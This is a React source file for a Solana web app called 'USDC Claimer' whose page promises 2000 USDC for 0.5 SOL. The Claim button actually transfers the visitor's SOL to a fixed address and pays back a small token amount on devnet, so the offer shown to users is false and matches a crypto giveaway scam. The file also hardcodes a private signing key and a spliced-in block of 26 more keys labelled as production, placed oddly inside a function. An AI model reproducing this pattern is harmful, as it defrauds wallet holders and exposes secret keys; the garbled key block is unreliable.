/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5aatF7QCtLtmWbbpZdCQykf7p1sYH1Z5Lm1Heq79BcLkLcXkDFAbfxUXcfZhk5Vhum5P5dHCYmn1XvAeXrggN9dU"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3eKd5sacru3wTKEidRe2SSvBc82DK5ABeBJnr1KqGQCseiKsWTAjfSzK8cv1zDovNqCvFRGP7SHKNd9y6USER6pF",
  "key1": "29fjciiwWf8fw1FGpwyYSnUnCoqWTsDTUTArkhznRSA88FGXk23VtcNPkSPDBHuVJ6krWEeYP1Z7x71qJauqjjhX",
  "key2": "6jJvkJP8Lxuz1jXWavuM2eAS9UBPYTy3tdHUKa2Hi3UVbeq7YrfmmiVdy9yUgz3a6i3XansS7ryvXQ6cy9GsfLj",
  "key3": "31FDFRnStaSnsjNRW23c6u3pbqeHfucJwyTzkzeY4C1cUeZEZrp8u3qCPdypkcB9EjuxBv7wJrMyGH5MQwi7MHhN",
  "key4": "SX4abENHiGgyhioDAzFpxG8hox1rTrM1nYtW4DFu7uonyWvHMSf3vvFuon7M2uMb3grFHs69sFVv8W2K6ERy5dh",
  "key5": "5SUCf3W3e9BF1ZPDSKHtinrTAcqL5qVWGqja67zttdZFeeNN7H4FZFFx9o7JcJB5DU5yrk9yk1QGx7KVJceDM7hT",
  "key6": "2kftS2hhSBeyxNz4AEmzm6fFTd9BCW37B6VLXowTo1Lvjeo33KV3XrsMrEizRd2PtKPi6wYNmfNfw8GKvrxZ2YNg",
  "key7": "2wbyCn63BdfHBxX7oUGFMkpESA5dmewzKUjpECiiS8cP1oW6mnsB1hQPSaY7PFnR1SuCfuJnPT4366xXUzDiyPZX",
  "key8": "5inyqb8e4B4V436A6RBVAHaSNgGfbSYgRXeHkbGYyPwdoh8VL9K4BWY4uszLesQ1TfnCPFLSLB4KRvYVwKwatyLY",
  "key9": "62H7qx4m3NgcXtiKpnnHA6CbX8B8ZiQkLxgz4dCaeVUMkXBPNnkhbwUsPqqPF2E5Z3TMxMgv4fev4zxU5tLUMUPE",
  "key10": "5BHtPCzU44MDJ9GxmNFrGw4j9zmrzhynVTTiS7BDQACDF6742uedkvchHv1XF8bxQkMbi8rTuSWzskXHVadKTVD4",
  "key11": "5ATArYDWEHqC989TSoL95beoHyC2vY8yPxMm3PMyzCBdhBijHgJCn1UwsnXFG91aqJykrjNYifF2EFZ3fcDF2Br7",
  "key12": "2ajQgNGi3UHJHQZzZqn6gQLsmtLuPpED1yvvErAb76WHhYVXC4QvKcf3ao1VsqsQD9CAa4StVcJKuA66r5UER3b",
  "key13": "z9JpKVSFrbCTcuFRWcQY4tT7t43wdHjbCJ9nxt3m9RaBiJYQufze94pErFEh5wURZbN8nzzX1ynxmuuvLigj4t6",
  "key14": "42P8EDijDeMFMZuYSHWUGhS3aCmfPqfijy7mm7EDThiGY6QEz4QquxNeADGjgqZaKQ5Y8iMkBS4sobJBvefTZhWs",
  "key15": "67mXpUEsxsMGxernDJoc22UMKot4t9sKr14BcFHuTHzsmKGaaaNk8eW5CSQbFeRFP5QHJeZamjUtmxN32AZNDXs3",
  "key16": "QrqS5za8mXsZWstjeJNLVg6yjhkFSJ2jRQpSkxLTJ3AfAF5RH6XCx2AeLz9v5fSG47tRyAQrbABRN67iMYqDD4i",
  "key17": "29YKAKnx82fWQyc8oVhZboBnRhqd8HLNQUixrMHSY19z2BbDX6g4cft9RdTcJCsWCuYAQAd1WCNsWSj3Rp6M86sx",
  "key18": "5RCSVMNREjDyeMy3UX5B1n3f26wG6oB8TqTEg2GcN5cTiKHYnDUwub9UcT5mbbun6ypGS8rrMxszga3uvwqHR7wH",
  "key19": "29FyUzYpQtmHr5VFKjdBWszsx6FjXPmQAN9bsuA1XZQPy7WUvwpf7HCHV2WG6SuhhNz7cfC1MeU9BUDFikPr6TFk",
  "key20": "2QSwZggqVjkqtkoMUYcSBPw5c1KKi2ocjpppiyfyvSftjyAAWqMBYN7hT7GEisNZrxRZdtLrBB1CQJ8hryDnSpem",
  "key21": "9nnwu1kJx9GBwUie2pM9GpGMNVSHUJUQ58oRZAaWkZ2rFZKh1Va9ALKW6YDgfkdNRvr1RbgketUW7Mk71GiHjop",
  "key22": "2Vrx1EmZaATvzgd7kyvQgziXUWYHDueXGQ5V1Rwwqsv2LotjcMHAqB7b3vPnQ3ze9nsPe6ZdSGWfLuzHLwPBfEPi",
  "key23": "51sNReWeaQU7qXMRe2eRPKVcGfbPAaKeQQN9c3gEj6rTFAPadwbqDSWA157eKQZ8tqazEW6wJSp9TbW3gCCoa1or",
  "key24": "2FTcTgDkGsoJj3cYQHsqfShcMnWUE7nBA8BF3tKzvEGNrycbmddXCXtvVKUoNoTGmgsFcf8VJbLSYpqX4PxLjE31",
  "key25": "3RKaUvZGDJ3L86dqBev85uCZeZETYaLmabNPdtWFynYBps7UiTFwmLoR5XsMERbYx6hFzjZo2Y7Hj3EUUQ4j6mHm"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
